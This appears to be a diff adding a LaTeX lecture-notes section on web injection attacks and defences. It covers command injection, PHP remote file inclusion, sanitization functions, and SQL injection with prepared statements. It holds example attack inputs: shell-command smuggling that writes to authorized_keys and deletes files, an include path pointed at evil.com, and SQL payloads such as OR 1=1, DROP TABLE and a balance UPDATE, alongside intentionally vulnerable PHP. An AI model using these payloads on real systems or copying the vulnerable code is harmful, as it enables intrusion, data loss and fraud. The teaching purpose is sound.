@@ -1,0 +1,106 @@
+\section{Injection}
+
+\subsection{Command Injection Attacks}
+Command injection attacks happen in the following scenarios: 
+
+- user input is executed as part of a command on the server because of incorrect sanitization or lack of sanitization  
+
+- developers use unsanitized user input to compose a string that is evaluated as code or as the filename of code  
+
+- attackers provide an input that includes not only data but also commands  
+
+For example, consider a server application as a calculator, which uses \texttt{eval()} to compute the result of an expression, for example,
+
+\begin{verbatim}
+  $exp = $_GET["exp"];
+  eval('$result = ' . $exp . ';');
+  echo $result;
+\end{verbatim}
+
+Then a malicious request like \texttt{http://site.com/calc.php?exp="1+2; system(`rm /../passwd')"} might be used to attack. 
+
+The server can also invoke a CGI program to execute a grep command using user input as a parameter. For example,
+
+case 1: \texttt{system("grep \$exp file.txt")}
+
+This can be attacked by using \texttt{; echo `xxx' > /.ssh/authorized\_keys; rm}, which gives
+
+\texttt{grep ; echo `xxx' > /.ssh/authorized\_keys; rm file.txt}
+
+case 2: \texttt{system("grep \textbackslash"\$exp\textbackslash" file.txt")}
+
+This includes a minor fix, yet it can still be attacked by using \texttt{\textbackslash" foo; echo `xxx' > /.ssh/authorized\_keys; rm \textbackslash"}, which gives
+
+\texttt{grep "" foo; echo `xxx' > /.ssh/authorized\_keys; rm "" file.txt}
+
+case 3: \texttt{system("grep", "-e", \$exp, "file.txt")}
+
+This is a safe version where no shell is called. 
+
+\subsection{File Inclusion Attacks}
+Many programming languages and web frameworks allow a developer to include a code component to modularize the application. Therefore, it is possible to inject code into the application if it is not configured correctly. For example:
+
+case 1: upload code that is then included  
+
+case 2: provide a remote code component if remote inclusion is supported  
+
+case 3: manipulate the path that is used to locate the code component  
+
+PHP allows remote files to be included with the \texttt{allow\_url\_fopen} directive. One can execute arbitrary code if user input is used to build the file name, for example, 
+
+\begin{verbatim}
+  // index.php
+  $include_path = "/includes/";
+  include($include_path . "lib.php");
+
+  // lib.php
+  include($include_path . "a.php");
+\end{verbatim}
+
+Then the attacker can request \texttt{GET /includes/lib.php?include\_path=http://www.evil.com/}. This will create variables from GET parameters and override the original \texttt{\$include\_path}, so it becomes \texttt{\$include\_path = "http://www.evil.com/"}. 
+
+One can also inject HTML tags into a web page to modify its behaviour, e.g., use \texttt{<iframe>} to force a user to visit a web page or use \texttt{<form>} to collect user credentials. 
+
+\subsection{Sanitization}
+As web applications accept user inputs, and they can be used to construct commands, inputs should be sanitized before being used as commands by removing or escaping meta-characters. However, it is unreliable to block all bad inputs, making it hard to sanitize completely. Thus, dangerous APIs should be avoided entirely. 
+
+There are some techniques in PHP to do sanitization:
+
+- \texttt{strip\_tags(\$str)}: strips NULL bytes, HTML, and PHP tags from input  
+
+- \texttt{htmlentities(\$str, \$flags)}: converts special characters and all characters which have HTML entity equivalents in \texttt{\$str} to HTML entities  
+
+- \texttt{escapeshellarg(\$str)}: adds single quotes around a string and quotes/escapes any existing single quotes, allowing you to pass the string safely as an argument to a shell command  
+
+- \texttt{escapeshellcmd(\$str)}: escapes any characters that might be used to trick a shell command into executing arbitrary commands  
+
+\subsection{SQL Injection Attacks}
+SQL is a database query language that is widely used in web applications, and it is possible to inject code or commands into SQL queries that are built from user input. The server-side application code can make SQL queries to the associated database like the following:
+
+\begin{verbatim}
+  $recipient = $_POST["recipient"];
+  $sql = "SELECT AcctNum FROM Users WHERE Balance < 100 AND Name=`$recipient'";
+  $result = $conn->query($sql);
+  if ($result->num_rows > 0) {
+    $row = $result->fetch_assoc();
+    echo "The recipient's account number is " . $row["AcctNum"] . "<br>";
+  }
+\end{verbatim}
+
+By using special characters like tick (`), comment (\texttt{-{}-}), space (+), @var, @@var, and wildcard (\%), it is possible to modify queries in an unexpected way, probe the database schema, or even run commands. 
+
+For example, when \texttt{\$recipient = ' OR 1=1}, we have \texttt{\$sql = "SELECT AcctNum FROM Users WHERE Balance < 100 AND Name=`' OR 1=1'";}. This can return all rows from the table \texttt{Users}, yet the single quote after \texttt{1=1} might raise a syntax error. If \texttt{\$recipient = ' OR 1=1 -{}-}, it will return all rows from the table. 
+
+There are also other possible cases, e.g., using \texttt{'; DROP TABLE Users; -{}-}, \texttt{'; SELECT * FROM Users; -{}-}, \texttt{'; UPDATE Users SET Balance=999 WHERE AcctNum=1234; -{}-}, etc. 
+
+As it is possible to modify any type of SQL queries, developers should never allow user-supplied data to modify SQL statements directly. This can be achieved by the following: 
+
+\textbf{1. Stored Procedures} 
+
+The application is isolated from SQL operations, and all SQL statements are implemented as stored procedures on the database server. For example, SQL statements are taken out of the web application and moved into the database, and a stored procedure is invoked instead of building an SQL query from a string. 
+
+\textbf{2. Prepared Statements} 
+
+Statements are compiled into SQL statements before user input is added, and the database server builds a corresponding fixed parse tree. 
+
+Prepared statements allow for a clearer separation of data and code. A query is first parsed and the locations of the parameters are identified. Then the parameters are bound to their actual values. This can also improve the performance of a query in some cases. 
